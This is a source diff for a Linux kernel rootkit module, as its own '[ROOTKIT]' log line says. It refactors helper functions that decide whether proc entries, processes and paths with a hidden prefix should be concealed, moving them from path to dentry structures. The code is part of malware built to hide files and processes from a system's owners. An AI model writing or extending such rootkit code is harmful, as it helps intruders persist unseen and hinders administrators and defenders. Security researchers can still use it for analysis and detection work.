@@ -67,6 +67,21 @@ static inline bool is_file_root(const file_t *const p_file)
 }
 
 /**
+ * Is the given dentry structure in a `proc` filesystem?
+ *
+ * @param p_dentry The dentry structure
+ * @return `true` if the given dentry structure is in a proc filesystem, `false` otherwise
+ */
+static inline bool is_dentry_in_proc(const dentry_t *const p_dentry)
+{
+    IF_U (p_dentry == NULL || p_dentry->d_inode == NULL || p_dentry->d_inode->i_sb == NULL) {
+        return false;
+    }
+
+    return p_dentry->d_inode->i_sb->s_magic == PROC_SUPER_MAGIC;
+}
+
+/**
  * Is the given path structure in a `proc` filesystem?
  *
  * @param p_path The path structure
@@ -74,12 +89,11 @@ static inline bool is_file_root(const file_t *const p_file)
  */
 static inline bool is_path_in_proc(const path_t *const p_path)
 {
-    IF_U (p_path == NULL || p_path->dentry == NULL || p_path->dentry->d_inode == NULL ||
-          p_path->dentry->d_inode->i_sb == NULL) {
+    IF_U (p_path == NULL) {
         return false;
     }
 
-    return p_path->dentry->d_inode->i_sb->s_magic == PROC_SUPER_MAGIC;
+    return is_dentry_in_proc(p_path->dentry);
 }
 
 /**
@@ -98,6 +112,21 @@ static inline bool is_file_in_proc(const file_t *const p_file)
 }
 
 /**
+ * Is the given dentry structure the root of a `proc` filesystem?
+ *
+ * @param p_dentry The dentry structure
+ * @return `true` if the given dentry structure is the root of a proc filesystem, `false` otherwise
+ */
+static inline bool is_dentry_proc_root(const dentry_t *const p_dentry)
+{
+    IF_U (p_dentry == NULL) {
+        return false;
+    }
+
+    return IS_ROOT(p_dentry) && is_dentry_in_proc(p_dentry);
+}
+
+/**
  * Is the given path structure the root of a `proc` filesystem?
  *
  * @param p_path The path structure
@@ -109,7 +138,7 @@ static inline bool is_path_proc_root(const path_t *const p_path)
         return false;
     }
 
-    return is_path_root(p_path) && is_path_in_proc(p_path);
+    return is_dentry_proc_root(p_path->dentry);
 }
 
 /**
@@ -128,6 +157,22 @@ static inline bool is_file_proc_root(const file_t *const p_file)
 }
 
 /**
+ * Is the parent of the given dentry structure the root of a `proc` filesystem?
+ *
+ * @param p_dentry The dentry structure
+ * @return `true` if the parent of the given dentry structure is the root of a proc filesystem,
+ *         `false` otherwise
+ */
+static inline bool is_dentry_parent_proc_root(const dentry_t *const p_dentry)
+{
+    IF_U (p_dentry == NULL) {
+        return false;
+    }
+
+    return IS_ROOT(p_dentry->d_parent) && is_dentry_in_proc(p_dentry);
+}
+
+/**
  * Is the parent of the given path structure the root of a `proc` filesystem?
  *
  * @param p_path The path structure
@@ -140,7 +185,7 @@ static inline bool is_path_parent_proc_root(const path_t *const p_path)
         return false;
     }
 
-    return IS_ROOT(p_path->dentry->d_parent) && is_path_in_proc(p_path);
+    return is_dentry_parent_proc_root(p_path->dentry);
 }
 
 /**
@@ -160,6 +205,22 @@ static inline bool is_file_parent_proc_root(const file_t *const p_file)
 }
 
 /**
+ * Is the given dentry structure a strict descendant of the root of a `proc` filesystem?
+ *
+ * @param p_dentry The dentry structure
+ * @return `true` if the given dentry structure is a strict descendant of the root of a proc
+ *         filesystem, `false` otherwise
+ */
+static inline bool is_dentry_proc_descendant(const dentry_t *const p_dentry)
+{
+    IF_U (p_dentry == NULL) {
+        return false;
+    }
+
+    return !IS_ROOT(p_dentry) && is_dentry_in_proc(p_dentry);
+}
+
+/**
  * Is the given path structure a strict descendant of the root of a `proc` filesystem?
  *
  * @param p_path The path structure
@@ -172,7 +233,7 @@ static inline bool is_path_proc_descendant(const path_t *const p_path)
         return false;
     }
 
-    return !is_path_root(p_path) && is_path_in_proc(p_path);
+    return is_dentry_proc_descendant(p_path->dentry);
 }
 
 /**
@@ -192,6 +253,17 @@ static inline bool is_file_proc_descendant(const file_t *const p_file)
 }
 
 /**
+ * Is the given dentry structure a process file/dir?
+ *
+ * @param p_dentry The dentry structure
+ * @param ps_name  (Optional) This gets set to the name of the first directory
+ *                 in the dentry after its root
+ * @param p_pid    This gets set to the corresponding PID, if the given dentry structure is a process
+ * @return `true` if the given dentry structure is a process file/dir, `false` otherwise
+ */
+bool is_process_dentry(const dentry_t *const p_dentry, const char **const ps_name, pid_t *p_pid);
+
+/**
  * Is the given path structure a process file/dir?
  *
  * @param p_path   The path structure
@@ -200,7 +272,21 @@ static inline bool is_file_proc_descendant(const file_t *const p_file)
  * @param p_pid    This gets set to the corresponding PID, if the given path structure is a process
  * @return `true` if the given path structure is a process file/dir, `false` otherwise
  */
-bool is_process_path(const path_t *const p_path, const char **const ps_name, pid_t *p_pid);
+static inline bool is_process_path(const path_t *const p_path, const char **const ps_name,
+                                   pid_t *p_pid)
+{
+    IF_U (p_path == NULL) {
+        if (ps_name != NULL) {
+            *ps_name = NULL;
+        }
+        if (p_pid != NULL) {
+            *p_pid = -1;
+        }
+        return false;
+    }
+
+    return is_process_dentry(p_path->dentry, ps_name, p_pid);
+}
 
 /**
  * Is the given file structure a process file?
@@ -272,18 +358,22 @@ static inline bool is_filename_or_pid_hidden(const char *const s_filename,
 }
 
 /**
- * Is one of the parent directories of the given path structure hidden?
+ * Is one of the parent directories of the given dentry structure hidden?
  * @note Does not check if the final component of the path is hidden.
  *
- * @param p_path The path structure to check
- * @return `true` if one of the parent directories of the given path structure is hidden,
+ * @param p_dentry The dentry structure to check
+ * @return `true` if one of the parent directories of the given dentry structure is hidden,
  *         `false` otherwise
  */
-static inline bool is_path_hierarchy_hidden(const path_t *const p_path)
+static inline bool is_dentry_hierarchy_hidden(const dentry_t *const p_dentry)
 {
     const dentry_t *p_parent = NULL; // dentry structure for parent directories
 
-    p_parent = p_path->dentry->d_parent;
+    IF_U (p_dentry == NULL) {
+        return false;
+    }
+
+    p_parent = p_dentry->d_parent;
     while (!IS_ROOT(p_parent)) {
         if (is_filename_hidden(p_parent->d_name.name)) {
             pr_info("[ROOTKIT] * Parent directory is hidden: %s\n", p_parent->d_name.name);
@@ -297,6 +387,33 @@ static inline bool is_path_hierarchy_hidden(const path_t *const p_path)
 }
 
 /**
+ * Is one of the parent directories of the given path structure hidden?
+ * @note Does not check if the final component of the path is hidden.
+ *
+ * @param p_path The path structure to check
+ * @return `true` if one of the parent directories of the given path structure is hidden,
+ *         `false` otherwise
+ */
+static inline bool is_path_hierarchy_hidden(const path_t *const p_path)
+{
+    IF_U (p_path == NULL) {
+        return false;
+    }
+
+    return is_dentry_hierarchy_hidden(p_path->dentry);
+}
+
+/**
+ * Does the given dentry need to be hidden?
+ * @note Checks if the dentry is a process file/dir and needs to be hidden,
+ *       or if the file name starts with the hidden prefix.
+ *
+ * @param p_dentry The dentry structure to check
+ * @return `true` if the given dentry needs to be hidden, `false` otherwise
+ */
+bool is_dentry_hidden(const dentry_t *const p_dentry);
+
+/**
  * Does the given path need to be hidden?
  * @note Checks if the path is a process file/dir and needs to be hidden,
  *       or if the file name starts with the hidden prefix.
@@ -304,7 +421,14 @@ static inline bool is_path_hierarchy_hidden(const path_t *const p_path)
  * @param p_path The path structure to check
  * @return `true` if the given path needs to be hidden, `false` otherwise
  */
-bool is_path_hidden(const path_t *const p_path);
+static inline bool is_path_hidden(const path_t *const p_path)
+{
+    IF_U (p_path == NULL) {
+        return false;
+    }
+
+    return is_dentry_hidden(p_path->dentry);
+}
 
 /**
  * Does the given pathname need to be hidden?
